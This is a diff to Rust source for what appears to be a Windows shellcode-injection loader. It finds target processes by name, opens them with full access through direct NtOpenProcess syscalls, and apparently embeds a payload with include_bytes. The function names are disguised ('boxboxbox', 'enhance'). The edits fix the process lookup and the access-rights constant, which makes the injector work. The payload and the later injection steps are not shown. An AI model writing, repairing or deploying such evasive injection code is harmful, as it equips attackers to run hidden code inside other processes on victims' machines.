@@ -2,14 +2,12 @@
 #![allow(non_snake_case)]
 
 use sysinfo::System;
-use std::ffi::OsStr;
 use std::include_bytes;
 use rust_syscalls::syscall;
 
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE},
-        lmaccess::{ACCESS_ALL}
+        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PROCESS_ALL_ACCESS}
     },
     shared::{
         ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
@@ -34,8 +32,11 @@ use std::time::Instant;
 fn boxboxbox(tar: &str) -> Vec<usize> {
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
-    for pro in s.processes_by_exact_name(OsStr::new(tar)) {
-        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+    let tar_lower = tar.to_lowercase();
+    for (_, pro) in s.processes() {
+        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
+            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+        }
     }
     dom
 }
@@ -69,7 +70,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
     };
 
     unsafe {
-        let s = syscall!("NtOpenProcess", &mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
+        let s = syscall!("NtOpenProcess", &mut process_handle, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
         if !NT_SUCCESS(s) { return; }
 
         pause(150);
